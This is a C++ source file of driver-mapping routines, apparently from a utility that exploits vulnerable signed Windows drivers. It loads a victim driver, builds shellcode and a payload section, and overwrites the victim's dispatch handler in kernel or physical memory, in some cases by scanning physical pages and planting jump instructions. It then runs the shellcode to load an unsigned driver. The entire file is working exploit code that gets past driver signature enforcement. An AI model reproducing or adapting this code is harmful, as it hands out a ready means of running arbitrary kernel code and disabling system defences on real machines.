/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       DRVMAP.CPP
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* KDUShowPayloadResult
*
* Purpose:
*
* Query and display shellcode result.
*
*/
VOID KDUShowPayloadResult(
    _In_ PKDU_CONTEXT Context,
    _In_ HANDLE SectionHandle
)
{
    NTSTATUS ntStatus;
    ULONG payloadSize = 0;
    SIZE_T viewSize;

    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    pvPayloadHead.Ref = NULL;

    ScSizeOf(Context->ShellVersion, &payloadSize);
    viewSize = ALIGN_UP_BY(payloadSize, PAGE_SIZE);

    ntStatus = NtMapViewOfSection(SectionHandle,
        NtCurrentProcess(),
        &pvPayloadHead.Ref,
        0,
        PAGE_SIZE,
        NULL,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_READWRITE);

    if (NT_SUCCESS(ntStatus)) {

        switch (Context->ShellVersion) {

        case KDU_SHELLCODE_V2:

            supPrintfEvent(kduEventInformation,
                "[~] Shellcode result, system worker: 0x%p\r\n",
                (PVOID)pvPayloadHead.Version.v1->IoStatus.Information);

            break;

        case KDU_SHELLCODE_V3:
        case KDU_SHELLCODE_V1:
        default:

            supPrintfEvent(kduEventInformation,
                "[~] Shellcode result: NTSTATUS (0x%lX)\r\n", pvPayloadHead.Version.v1->IoStatus.Status);

            break;
        }

        NtUnmapViewOfSection(NtCurrentProcess(), pvPayloadHead.Ref);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Cannot map shellcode section, NTSTATUS (%lX)\r\n", ntStatus);

    }
}

/*
* KDUStorePayloadInSection
*
* Purpose:
*
* Load input file as image, resolve import and store result in shared section.
*
*/
BOOL KDUStorePayloadInSection(
    _In_ PKDU_CONTEXT Context,
    _Out_ PHANDLE SectionHandle,
    _Out_ PSIZE_T ViewSize,
    _In_ PVOID ImageBase,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    BOOL bSuccess = FALSE;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
    HANDLE sectionHandle = NULL;
    PACL defaultAcl = NULL;
    PVOID pvSharedSection = NULL, dataPtr = NULL;

    PIMAGE_NT_HEADERS ntHeader;

    UNICODE_STRING uStr;
    OBJECT_ATTRIBUTES objAttr;
    PSECURITY_DESCRIPTOR sectionSD = NULL;

    UUID secUuid;
    WCHAR szName[100];

    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;
    *ViewSize = 0;

    do {

        SIZE_T cbPayloadHead;

        switch (Context->ShellVersion) {
        case KDU_SHELLCODE_V3:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V3);
            break;
        case KDU_SHELLCODE_V2:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V2);
            break;
        case KDU_SHELLCODE_V1:
        default:
            cbPayloadHead = sizeof(PAYLOAD_HEADER_V1);
            break;
        }

        //
        // Allocate space for header per version.
        //
        pvPayloadHead.Ref = supHeapAlloc(cbPayloadHead);
        if (pvPayloadHead.Ref == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Error, payload header not allocated\r\n");

            break;
        }

        //
        // Create SD for section.
        //
        ntStatus = supCreateSystemAdminAccessSD(&sectionSD, &defaultAcl);
        if (!NT_SUCCESS(ntStatus)) {

            supPrintfEvent(kduEventError,
                "[!] Error, shared section SD not allocated, NTSTATUS (0x%lX)\r\n", ntStatus);

            break;
        }

        //
        // Create UUID.
        //
        if (RPC_S_OK != UuidCreate(&secUuid)) {

            supPrintfEvent(kduEventError,
                "[!] Could not allocate shared section UUID, GetLastError %lu\r\n", GetLastError());

            break;
        }

        ntHeader = RtlImageNtHeader(ImageBase);

        //
        // Resolve import (ntoskrnl only).
        //
        ULONG isz = ntHeader->OptionalHeader.SizeOfImage;

        dataPtr = supHeapAlloc(isz);
        if (dataPtr) {
            RtlCopyMemory(dataPtr, ImageBase, isz);

            printf_s("[+] Resolving kernel import for input driver\r\n");
            supResolveKernelImport((ULONG_PTR)dataPtr, KernelImage, KernelBase);

        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Could not allocate memory for image\r\n");

            break;
        }

        //
        // Create shared section.
        //
        RtlSecureZeroMemory(szName, sizeof(szName));
        StringCchPrintf(szName, RTL_NUMBER_OF(szName),
            L"\\BaseNamedObjects\\{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
            secUuid.Data1, secUuid.Data2, secUuid.Data3,
            secUuid.Data4[0],
            secUuid.Data4[1],
            secUuid.Data4[2],
            secUuid.Data4[3],
            secUuid.Data4[4],
            secUuid.Data4[5],
            secUuid.Data4[6],
            secUuid.Data4[7]);

        RtlInitUnicodeString(&uStr, szName);
        InitializeObjectAttributes(&objAttr, &uStr, OBJ_CASE_INSENSITIVE, NULL, sectionSD);

        LARGE_INTEGER liSectionSize;
        SIZE_T viewSize = ALIGN_UP_BY(isz + cbPayloadHead, PAGE_SIZE);

        liSectionSize.QuadPart = viewSize;
        *ViewSize = viewSize;

        ntStatus = NtCreateSection(&sectionHandle,
            SECTION_ALL_ACCESS,
            &objAttr,
            &liSectionSize,
            PAGE_READWRITE,
            SEC_COMMIT,
            NULL);

        if (!NT_SUCCESS(ntStatus)) {

            supPrintfEvent(kduEventError,
                "[!] Error, cannot create shared section, NTSTATUS (0x%lX)\r\n", ntStatus);

            break;
        }

        ntStatus = NtMapViewOfSection(sectionHandle,
            NtCurrentProcess(),
            &pvSharedSection,
            0,
            PAGE_SIZE,
            NULL,
            &viewSize,
            ViewUnmap,
            MEM_TOP_DOWN,
            PAGE_READWRITE);

        if (NT_SUCCESS(ntStatus)) {

            printf_s("[+] Resolving payload import\r\n");

            if (ScResolveImportForPayload(
                Context->ShellVersion,
                pvPayloadHead.Ref,
                KernelImage,
                KernelBase))
            {
                EncodeBuffer(dataPtr, isz, Context->EncryptKey);

                switch (Context->ShellVersion) {
                case KDU_SHELLCODE_V3:
                    pvPayloadHead.Version.v3->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V2:
                    pvPayloadHead.Version.v2->ImageSize = isz;
                    break;
                case KDU_SHELLCODE_V1:
                default:
                    pvPayloadHead.Version.v1->ImageSize = isz;
                    break;
                }

                //
                // This field is version independent.
                //
                pvPayloadHead.Version.v1->IoStatus.Status = STATUS_UNSUCCESSFUL;

                if (!ScStoreVersionSpecificData(Context, pvPayloadHead.Ref)) {

                    supPrintfEvent(kduEventError,
                        "[!] Error, cannot store additional data for shellcode\r\n");

                    break;
                }

                RtlCopyMemory(pvSharedSection, pvPayloadHead.Ref, cbPayloadHead);
                RtlCopyMemory(RtlOffsetToPointer(pvSharedSection, cbPayloadHead), dataPtr, isz);

                NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
                *SectionHandle = sectionHandle;
                bSuccess = TRUE;
            }
            else {

                supPrintfEvent(kduEventError,
                    "[!] Error, resolving additional import failed\r\n");

            }

        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Error, shared section not mapped, NTSTATUS (0x%lX)\r\n", ntStatus);

        }

    } while (FALSE);

    SetLastError(RtlNtStatusToDosError(ntStatus));

    if (dataPtr) supHeapFree(dataPtr);
    if (sectionSD) supHeapFree(sectionSD);
    if (pvPayloadHead.Ref) supHeapFree(pvPayloadHead.Ref);
    if (defaultAcl) supHeapFree(defaultAcl);

    if (bSuccess == FALSE) {

        if (pvSharedSection) NtUnmapViewOfSection(NtCurrentProcess(), pvSharedSection);
        if (sectionHandle) NtClose(sectionHandle);

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}

/*
* KDUSetupShellCode
*
* Purpose:
*
* Construct shellcode data, init code.
*
*/
PVOID KDUSetupShellCode(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PHANDLE SectionHandle)
{
    NTSTATUS ntStatus;
    ULONG procSize = 0;
    SIZE_T viewSize = 0;
    HANDLE sectionHandle = NULL;
    UNICODE_STRING ustr;

    ULONG_PTR KernelBase, KernelImage = 0;

    PVOID pvShellCode = NULL;

    WCHAR szNtOs[MAX_PATH * 2];

    FUNCTION_ENTER_MSG(__FUNCTION__);

    *SectionHandle = NULL;

    do {

        KernelBase = Context->NtOsBase;
        if (KernelBase == 0) {

            supPrintfEvent(kduEventError,
                "[!] Cannot query ntoskrnl loaded base, abort\r\n");

            break;
        }

        printf_s("[+] Loaded ntoskrnl base 0x%llX\r\n", KernelBase);

        //
        // Preload ntoskrnl.exe
        //
        _strcpy(szNtOs, USER_SHARED_DATA->NtSystemRoot);
        _strcat(szNtOs, L"\\system32\\ntoskrnl.exe");

        RtlInitUnicodeString(&ustr, szNtOs);
        ntStatus = LdrLoadDll(NULL, NULL, &ustr, (PVOID*)&KernelImage);

        if ((!NT_SUCCESS(ntStatus)) || (KernelImage == 0)) {

            supPrintfEvent(kduEventError,
                "[!] Error while loading ntoskrnl.exe, NTSTATUS (0x%lX)\r\n", ntStatus);

            break;
        }

        printf_s("[+] Ntoskrnl.exe mapped at 0x%llX\r\n", KernelImage);
        Context->NtOsMappedBase = KernelImage;

        //
        // Prepare and store payload for later shellcode use.
        //
        if (!KDUStorePayloadInSection(Context,
            &sectionHandle,
            &viewSize,
            ImageBase,
            KernelImage,
            KernelBase))
        {

            supPrintfEvent(kduEventError,
                "[!] Error while mapping payload, abort\r\n");

            break;
        }

        *SectionHandle = sectionHandle;

        //
        // Allocate shellcode.
        //
        pvShellCode = ScAllocate(Context->ShellVersion,
            sectionHandle,
            viewSize,
            KernelImage,
            KernelBase,
            Context->MemoryTag,
            &procSize);

        if (pvShellCode == NULL)
            break;

        if (procSize == 0) {

            supPrintfEvent(kduEventError,
                "[!] Unexpected shellcode procedure size, abort\r\n");

            ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));
            pvShellCode = NULL;
            break;
        }

        printf_s("[+] Bootstrap code size = 0x%lX\r\n", procSize);

    } while (FALSE);

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return pvShellCode;
}

/*
* KDUPagePatchCallback
*
* Purpose:
*
* Patch dispatch pages in physical memory.
*
*/
BOOL WINAPI KDUPagePatchCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext)
{
    BOOL bIoResult;
    PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;

    provReadPhysicalMemory ReadPhysicalMemory = Params->ReadPhysicalMemory;
    provWritePhysicalMemory WritePhysicalMemory = Params->WritePhysicalMemory;

    ULONG_PTR targetAddress = 0;

    PVOID dispatchSignature = Params->DispatchSignature;
    ULONG signatureSize = Params->DispatchSignatureLength;
    ULONG dispatchPageOffset = Params->DispatchHandlerPageOffset;

    BYTE buffer[PAGE_SIZE];
    RtlSecureZeroMemory(&buffer, sizeof(buffer));

    if (ReadPhysicalMemory(Params->DeviceHandle,
        Address,
        &buffer,
        PAGE_SIZE))
    {
        if (signatureSize == RtlCompareMemory(dispatchSignature,
            RtlOffsetToPointer(buffer, dispatchPageOffset),
            signatureSize))
        {
            printf_s("\t-> Found page with code at address 0x%llX\r\n", Address);
            Params->ccPagesFound += 1;

            if ((SIZE_T)dispatchPageOffset + (SIZE_T)Params->cbPayload > PAGE_SIZE) {

                unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };

                *(PULONG)&jmpcode[1] = Params->JmpAddress;

                printf_s("\t--> Setting jump[%lX][%lX] at address 0x%llX\r\n",
                    jmpcode[0],
                    *(PULONG)&jmpcode[1],
                    Address + dispatchPageOffset);

                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                    Address + dispatchPageOffset,
                    jmpcode,
                    sizeof(jmpcode));

                if (bIoResult) {

                    printf_s("\t--> Memory has been modified at address 0x%llX\r\n", Address + dispatchPageOffset);
                    printf_s("\t--> Overwriting page at address 0x%llX\r\n", Address);

                    targetAddress = Address;

                    bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                        targetAddress,
                        Params->pvPayload,
                        Params->cbPayload);

                }

            }
            else {

                targetAddress = Address + dispatchPageOffset;

                bIoResult = WritePhysicalMemory(Params->DeviceHandle,
                    targetAddress,
                    Params->pvPayload,
                    Params->cbPayload);

            }

            if (bIoResult) {
                Params->ccPagesModified += 1;
                printf_s("\t--> Memory has been modified at address 0x%llX\r\n", targetAddress);
            }
            else {
                supPrintfEvent(kduEventError,
                    "Could not modify memory at address 0x%llX\r\n", targetAddress);
            }

        }
    }

    return FALSE;
}

/*
* KDUDriverMapInit
*
* Purpose:
*
* Allocate shellcode structure and create sync event.
*
*/
BOOL KDUDriverMapInit(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase,
    _Out_ PVOID* ShellCode,
    _Out_ PHANDLE SectionHandle,
    _Out_ PHANDLE SyncEventHandle
)
{
    PVOID pvShellCode;
    HANDLE sectionHandle = NULL, readyEventHandle;

    *ShellCode = NULL;
    *SectionHandle = NULL;
    *SyncEventHandle = NULL;

    pvShellCode = KDUSetupShellCode(Context, ImageBase, &sectionHandle);
    if (pvShellCode == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Error while building shellcode, abort\r\n");

        return FALSE;
    }

    readyEventHandle = ScCreateReadyEvent(Context->ShellVersion, pvShellCode);
    if (readyEventHandle == NULL) {

        supPrintfEvent(kduEventError,
            "[!] Error building the ready event handle, abort\r\n");

        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));

        return FALSE;
    }

    *ShellCode = pvShellCode;
    *SectionHandle = sectionHandle;
    *SyncEventHandle = readyEventHandle;

    return TRUE;
}

/*
* KDUpMapDriverPhysicalTranslate
*
* Purpose:
*
* Process shellcode write through physical memory address translation.
*
*/
BOOL KDUpMapDriverPhysicalTranslate(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ PVICTIM_IMAGE_INFORMATION VictimImageInformation,
    _In_ ULONG_PTR TargetAddress
)
{
    BOOL bSuccess = FALSE;
    HANDLE deviceHandle = Context->DeviceHandle;
    HANDLE victimDeviceHandle = NULL;
    KDU_PROVIDER* prov = Context->Provider;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;

    ULONG dispatchPageOffset = VictimImageInformation->DispatchPageOffset;
    ULONG_PTR memPage, targetAddress = TargetAddress;

    provWriteKernelVM WriteKernelVM = prov->Callbacks.WriteKernelVM;

    do {

        if ((SIZE_T)dispatchPageOffset + (SIZE_T)ScSize > PAGE_SIZE) {

            memPage = (TargetAddress & 0xfffffffffffff000ull);
            printf_s("[~] Shellcode overlaps page boundary, switching target memory address to 0x%llX\r\n", memPage);

            unsigned char jmpcode[] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };

            *(PULONG)&jmpcode[1] = VictimImageInformation->JumpValue;

            printf_s("\t>> Setting jump[%lX][%lX] at address 0x%llX\r\n",
                jmpcode[0],
                *(PULONG)&jmpcode[1],
                TargetAddress);

            if (!WriteKernelVM(deviceHandle, TargetAddress, &jmpcode, sizeof(jmpcode))) {

                supPrintfEvent(kduEventError,
                    "[!] Error writting kernel memory, abort\r\n");

                break;

            }
            else {

                targetAddress = TargetAddress - dispatchPageOffset;

            }

        }

        //
        // Write shellcode to kernel.
        //
        printf_s("[+] Writing shellcode at 0x%llX address with size 0x%lX\r\n", targetAddress, ScSize);

        if (!WriteKernelVM(deviceHandle, targetAddress, ScBuffer, ScSize)) {

            supPrintfEvent(kduEventError,
                "[!] Error writting kernel memory, abort\r\n");
            break;
        }

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }

    } while (FALSE);

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUpMapDriverPhysicalBruteForce
*
* Purpose:
*
* Process shellcode write through physical memory bruteforce.
*
*/
BOOL KDUpMapDriverPhysicalBruteForce(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ PKDU_PHYSMEM_ENUM_PARAMS EnumParams
)
{
    BOOL bSuccess = FALSE;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
    HANDLE victimDeviceHandle = NULL;

    EnumParams->bWrite = TRUE;
    EnumParams->ccPagesFound = 0;
    EnumParams->ccPagesModified = 0;
    EnumParams->pvPayload = ScBuffer;
    EnumParams->cbPayload = ScSize;

    supPrintfEvent(kduEventInformation,
        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);

    if (supEnumeratePhysicalMemory(KDUPagePatchCallback, EnumParams)) {

        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
            EnumParams->ccPagesFound,
            EnumParams->ccPagesModified);

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }

    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Failed to enumerate physical memory.\r\n");

    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUpMapDriverDirectVM
*
* Purpose:
*
* Process shellcode write through direct virtual memory write primitive.
*
*/
BOOL KDUpMapDriverDirectVM(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize,
    _In_ HANDLE ScSectionHandle,
    _In_ HANDLE ReadyEventHandle,
    _In_ ULONG_PTR TargetAddress
)
{
    BOOL bSuccess = FALSE;
    KDU_PROVIDER* prov = Context->Provider;
    KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
    HANDLE victimDeviceHandle = NULL;

    //
    // Write shellcode to driver.
    //
    if (!prov->Callbacks.WriteKernelVM(Context->DeviceHandle,
        TargetAddress,
        ScBuffer,
        ScSize))
    {

        supPrintfEvent(kduEventError,
            "[!] Error writing shellcode to the target driver, abort\r\n");

    }
    else {

        printf_s("[+] Driver handler code modified\r\n");

        //
        // Execute shellcode.
        //
        printf_s("[+] Executing shellcode\r\n");
        VpExecutePayload(victimProv, &victimDeviceHandle);

        //
        // Wait for the shellcode to trigger the event
        //
        if (WaitForSingleObject(ReadyEventHandle, 2000) != WAIT_OBJECT_0) {

            supPrintfEvent(kduEventError,
                "[!] Shellcode did not trigger the event within two seconds.\r\n");

        }
        else
        {
            KDUShowPayloadResult(Context, ScSectionHandle);
            bSuccess = TRUE;
        }
    }

    //
    // Ensure victim handle is closed.
    //
    if (victimDeviceHandle) {
        NtClose(victimDeviceHandle);
        victimDeviceHandle = NULL;
    }

    return bSuccess;
}

/*
* KDUMapDriver
*
* Purpose:
*
* Run mapper.
*
*/
BOOL KDUMapDriver(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID ImageBase)
{
    BOOL bSuccess = FALSE;
    ULONG_PTR targetAddress = 0;
    PVOID pvShellCode = NULL;

    KDU_VICTIM_PROVIDER* victimProv;

    VICTIM_IMAGE_INFORMATION vi;
    VICTIM_DRIVER_INFORMATION vdi;
    KDU_PHYSMEM_ENUM_PARAMS enumParams;
    VICTIM_LOAD_PARAMETERS viLoadParams;

    ULONG dispatchOffset = 0;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    victimProv = Context->Victim;

    do {

        viLoadParams.Provider = victimProv;

        //
        // Load victim driver.
        //
        if (VpCreate(victimProv,
            Context->ModuleBase,
            NULL,
            VpLoadDriverCallback,
            &viLoadParams))
        {
            printf_s("[+] Successfully loaded victim driver\r\n");
        }
        else {

            supPrintfEvent(kduEventError,
                "[!] Could not load victim target, GetLastError %lu\r\n", GetLastError());

            break;

        }

        //
        // Query all required victim information.
        //
        RtlSecureZeroMemory(&vi, sizeof(vi));

        printf_s("[+] Query victim image information\r\n");

        if (VpQueryInformation(
            Context->Victim,
            VictimImageInformation,
            &vi,
            sizeof(vi)))
        {
            dispatchOffset = vi.DispatchOffset;

            RtlSecureZeroMemory(&vdi, sizeof(vdi));

            printf_s("[+] Query victim loaded driver layout\r\n");

            if (VpQueryInformation(
                Context->Victim,
                VictimDriverInformation,
                &vdi,
                sizeof(vdi)))
            {

                targetAddress = vdi.LoadedImageBase + dispatchOffset;

            }
            else {

                supPrintfEvent(kduEventError,
                    "[!] Could not query victim driver layout, GetLastError %lu\r\n", GetLastError());

                break;
            }

        }
        else
        {
            supPrintfEvent(kduEventError,
                "[!] Could not query victim image information, GetLastError %lu\r\n", GetLastError());

            break;
        }

        printf_s("[+] Victim target address 0x%llX\r\n", targetAddress);

        HANDLE sectionHandle = NULL, readyEventHandle = NULL;

        //
        // Prepare shellcode, signal event and shared section.
        //
        if (!KDUDriverMapInit(Context,
            ImageBase,
            &pvShellCode,
            &sectionHandle,
            &readyEventHandle))
        {
            break;
        }

        ULONG cbShellCode = ScSizeOf(Context->ShellVersion, NULL);

        //
        // Select proper handling depending on exploitable driver type.
        //
        if (Context->Provider->LoadData->PhysMemoryBruteForce) {

            //
            // 1. Physical memory mapping via MmMapIoSpace(Ex)
            //
            RtlSecureZeroMemory(&enumParams, sizeof(enumParams));

            enumParams.DeviceHandle = Context->DeviceHandle;
            enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
            enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

            enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
            enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

            enumParams.DispatchHandlerOffset = vi.DispatchOffset;
            enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
            enumParams.JmpAddress = vi.JumpValue;

            bSuccess = KDUpMapDriverPhysicalBruteForce(Context,
                pvShellCode,
                cbShellCode,
                sectionHandle,
                readyEventHandle,
                &enumParams);
        }
        else
            if (Context->Provider->LoadData->PML4FromLowStub || Context->Provider->LoadData->PreferPhysical) {
                //
                // 2. Physical section access type driver with virt2phys translation available.
                //
                bSuccess = KDUpMapDriverPhysicalTranslate(Context,
                    pvShellCode,
                    cbShellCode,
                    sectionHandle,
                    readyEventHandle,
                    &vi,
                    targetAddress);

            }
            else {
                //
                // 3. Direct VM write primitive available.
                //
                bSuccess = KDUpMapDriverDirectVM(Context,
                    pvShellCode,
                    cbShellCode,
                    sectionHandle,
                    readyEventHandle,
                    targetAddress);

            }

        if (readyEventHandle) CloseHandle(readyEventHandle);
        if (sectionHandle) NtClose(sectionHandle);

    } while (FALSE);

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, NULL)) {
        printf_s("[+] Victim released\r\n");
    }

    if (pvShellCode) 
        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}
